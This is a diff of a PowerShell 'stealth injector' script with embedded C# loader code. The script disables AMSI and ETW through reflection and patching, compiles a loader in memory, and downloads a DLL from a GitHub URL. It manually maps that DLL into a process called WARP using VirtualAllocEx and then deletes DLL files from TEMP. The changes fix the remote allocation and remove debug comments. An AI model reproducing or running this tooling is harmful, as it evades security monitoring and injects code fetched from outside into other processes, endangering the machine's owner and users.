@@ -3,9 +3,6 @@ param()
 
 Set-StrictMode -Version Latest
 
-# ============================================================
-# ★★★ DEBUG MODE — Console will stay visible ★★★
-# ============================================================
 $DebugMode = $true
 
 function Write-DebugInfo {
@@ -15,11 +12,8 @@ function Write-DebugInfo {
     }
 }
 
-# ============================================================
-# ★★★ START ★★★
-# ============================================================
 Write-Host "========================================" -ForegroundColor Magenta
-Write-Host "      STEALTH INJECTOR (DEBUG MODE)     " -ForegroundColor Magenta
+Write-Host "      STEALTH INJECTOR (FIXED)          " -ForegroundColor Magenta
 Write-Host "========================================" -ForegroundColor Magenta
 Write-DebugInfo "Script starting..." -Color "Green"
 
@@ -33,23 +27,18 @@ if (!([bool]([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsId
     Write-DebugInfo "✅ Running as Administrator." -Color "Green"
 }
 
-# ============================================================
-# ★★★ 1. Console Hide — SKIP (keep visible for debug) ★★★
-# ============================================================
 Write-DebugInfo "Console will stay visible (debug mode)." -Color "Yellow"
 
 # ============================================================
-# ★★★ 2. AMSI + ETW Bypass ★★★
+# ★★★ AMSI + ETW Bypass ★★★
 # ============================================================
 Write-DebugInfo "Bypassing AMSI and ETW..." -Color "Yellow"
 try {
-    # AMSI
     $a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
     $a.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
     $a.GetField('amsiSession','NonPublic,Static').SetValue($null,$null)
     Write-DebugInfo "✅ AMSI bypassed." -Color "Green"
 
-    # ETW
     Add-Type -TypeDefinition @"
     using System;
     using System.Runtime.InteropServices;
@@ -73,7 +62,7 @@ try {
 }
 
 # ============================================================
-# ★★★ 3. Compile C# Loader (in-memory) ★★★
+# ★★★ C# Loader (Fixed VirtualAllocEx) ★★★
 # ============================================================
 Write-DebugInfo "Compiling C# loader in memory..." -Color "Yellow"
 
@@ -96,6 +85,8 @@ public static class NativeLoader
 {
     [DllImport("kernel32.dll", SetLastError = true)]
     static extern IntPtr VirtualAlloc(IntPtr a, UIntPtr s, uint t, uint p);
+    [DllImport("kernel32.dll", SetLastError = true)]
+    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);  // ← FIXED
     [DllImport("kernel32.dll", SetLastError = true)]
     static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint p, out uint o);
     [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
@@ -169,7 +160,7 @@ public static class NativeLoader
             }
             Console.WriteLine("[C#] Process opened successfully.");
 
-            Console.WriteLine("[C#] Manual mapping DLL...");
+            Console.WriteLine("[C#] Manual mapping DLL (local)...");
             var result = Map(dll, false);
             if (result.ImageBase == IntPtr.Zero) {
                 Console.WriteLine("[C#] ERROR: Manual mapping failed.");
@@ -177,12 +168,12 @@ public static class NativeLoader
             }
             Console.WriteLine("[C#] Manual mapping successful. ImageBase: 0x" + result.ImageBase.ToString("X"));
 
-            Console.WriteLine("[C#] Allocating memory in WARP process...");
+            Console.WriteLine("[C#] Allocating memory in WARP process using VirtualAllocEx...");
             IntPtr remoteBase = IntPtr.Zero;
             UIntPtr size = (UIntPtr)result.ImageSize;
-            remoteBase = VirtualAlloc(hProc, UIntPtr.Zero, (uint)size, MC|MR, PER);
+            remoteBase = VirtualAllocEx(hProc, IntPtr.Zero, size, MC|MR, PER);  // ← FIXED: using VirtualAllocEx
             if (remoteBase == IntPtr.Zero) {
-                Console.WriteLine("[C#] ERROR: VirtualAllocEx failed.");
+                Console.WriteLine("[C#] ERROR: VirtualAllocEx failed. LastError: " + Marshal.GetLastWin32Error());
                 return false;
             }
             Console.WriteLine("[C#] Memory allocated at: 0x" + remoteBase.ToString("X"));
@@ -335,12 +326,12 @@ $loaderType = $assembly.GetType('NativeLoader')
 $method = $loaderType.GetMethod('InjectIntoWarp')
 
 # ============================================================
-# ★★★ 5. DLL Download ★★★
+# ★★★ Download DLL ★★★
 # ============================================================
 Write-DebugInfo "Downloading DLL from GitHub..." -Color "Yellow"
 try {
     $bytes = (New-Object System.Net.WebClient).DownloadData("https://github.com/desert007/bios/raw/refs/heads/main/version.dll")
-    Write-DebugInfo "✅ DLL downloaded successfully (size: $($bytes.Length) bytes)" -Color "Green"
+    Write-DebugInfo "✅ DLL downloaded (size: $($bytes.Length) bytes)" -Color "Green"
 } catch {
     Write-DebugInfo "❌ DLL download failed: $_" -Color "Red"
     Read-Host "Press ENTER to exit"
@@ -348,7 +339,7 @@ try {
 }
 
 # ============================================================
-# ★★★ 6. Injection Call ★★★
+# ★★★ Injection ★★★
 # ============================================================
 Write-DebugInfo "Calling injection method..." -Color "Yellow"
 Write-Host ""
@@ -367,7 +358,7 @@ try {
 }
 
 # ============================================================
-# ★★★ 7. Cleanup ★★★
+# ★★★ Cleanup ★★★
 # ============================================================
 Write-DebugInfo "Cleaning up..." -Color "Yellow"
 [System.GC]::Collect()
@@ -380,7 +371,7 @@ Get-ChildItem -Path $env:TEMP -Filter "*.dll" -File | Where-Object { $_.Creation
 Write-DebugInfo "✅ Cleanup complete." -Color "Green"
 
 # ============================================================
-# ★★★ END — KEEP CONSOLE OPEN ★★★
+# ★★★ END ★★★
 # ============================================================
 Write-DebugInfo "Script finished. Press ENTER to close this window." -Color "Magenta"
 Read-Host
